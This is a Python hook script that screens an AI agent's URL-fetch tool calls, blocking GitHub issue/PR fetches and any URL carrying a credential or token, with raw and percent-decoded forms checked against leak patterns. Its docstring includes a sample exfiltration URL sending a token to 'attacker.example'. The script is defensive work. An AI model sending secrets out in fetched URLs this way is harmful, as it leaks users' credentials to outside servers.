#!/usr/bin/env python3
"""PreToolUse gate for read_url_content.

1. Blocks GitHub issue/PR URL fetches, redirecting agents to safe_ingest.py
   (direct fetches bypass the trust gate and fail on private repos with 404).
2. Blocks URLs that carry a secret: a fetched URL is an outbound request, so
   `https://attacker.example/?d=<token>` is exfiltration. The URL (raw and
   percent-decoded) is scanned with the same leak patterns as Gate B — the
   built-in floor plus the workspace config.
"""
from __future__ import annotations

import json
import os
import re
import sys
from pathlib import Path
from urllib.parse import unquote_plus

from pre_tool_gate import compile_leak_patterns, load_config

GITHUB_ISSUE_PR_URL = re.compile(
    r"https?://github\.com/[^/]+/[^/]+/(?:issues|pull)/\d+"
)

REASON = (
    "Use safe_ingest.py instead of fetching GitHub URLs: Direct HTTP fetches of "
    "GitHub issue/PR pages are prohibited (private repos return 404). Extract the "
    "issue/PR number from the URL and run: "
    "`python3 ~/.gemini/config/plugins/bug-fixer-daemon/workspace-plugin/bug-fixer/scripts/safe_ingest.py issue-view <number>` "
    "(or `pr-view <number>` for PRs). Run from the repository root."
)

REASON_URL_LEAK = (
    "URL fetch blocked: the URL contains text matching a leak pattern (credential or "
    "token). Fetching it would send that value to the remote server."
)


def _decoded_forms(url: str) -> list[str]:
    """The URL plus its percent-decoded forms (handles double encoding)."""
    forms = [url]
    current = url
    for _ in range(3):
        decoded = unquote_plus(current)
        if decoded == current:
            break
        forms.append(decoded)
        current = decoded
    return forms


def url_leaks(url: str, leak_patterns: list[str] | None = None) -> bool:
    """True when the URL (raw or decoded) matches a built-in or configured leak pattern."""
    patterns = compile_leak_patterns(leak_patterns)
    return any(p.search(form) for form in _decoded_forms(url) for p in patterns)


def _configured_patterns(workspace_paths: list[str]) -> list[str]:
    try:
        return list(load_config(None, workspace_paths=workspace_paths).get("leak_patterns") or [])
    except Exception:  # noqa: BLE001 - the built-in floor still applies
        return []


def _is_enrolled(workspace_paths: list[str]) -> bool:
    """Check if any workspace path matches a sidecar config's repo_dir.

    Fails closed: returns True on error so GitHub URL blocking stays on.
    """
    try:
        cfg = load_config(None, workspace_paths=workspace_paths)
        return cfg.get("_enrolled", True) is not False
    except Exception as exc:
        print(f"github_url_gate: config error (failing closed): {exc}", file=sys.stderr)
        return True  # fail closed — enforce blocking


def main() -> int:
    if sys.stdin.isatty():
        print("GitHub URL gate for read_url_content PreToolUse hook.")
        return 0

    raw = sys.stdin.read().strip()
    stdin_data = {}
    if raw:
        try:
            raw_json = json.loads(raw)
            if isinstance(raw_json, dict):
                stdin_data = raw_json
        except (json.JSONDecodeError, ValueError):
            pass

    if not stdin_data:
        print(json.dumps({"decision": "allow"}))
        return 0

    payload = stdin_data
    workspace_paths = stdin_data.get("workspacePaths", [])

    # Extract the URL from the tool call args
    tool_call = payload.get("toolCall", {})
    args = tool_call.get("args", {}) if isinstance(tool_call, dict) else {}
    if not isinstance(args, dict) or not args:
        args = payload.get("tool_input") or payload.get("args") or {}
    url = str(args.get("Url") or args.get("url") or "").strip() if isinstance(args, dict) else ""

    # Only enforce in enrolled workspaces (sidecar config exists for this repo)
    enrolled = _is_enrolled(workspace_paths)

    if url and GITHUB_ISSUE_PR_URL.search(url) and enrolled:
        print(json.dumps({"decision": "deny", "reason": REASON}))
    elif url and url_leaks(url, _configured_patterns(workspace_paths)):
        print(json.dumps({"decision": "deny", "reason": REASON_URL_LEAK}))
    else:
        print(json.dumps({"decision": "allow"}))

    return 0


if __name__ == "__main__":
    sys.exit(main())
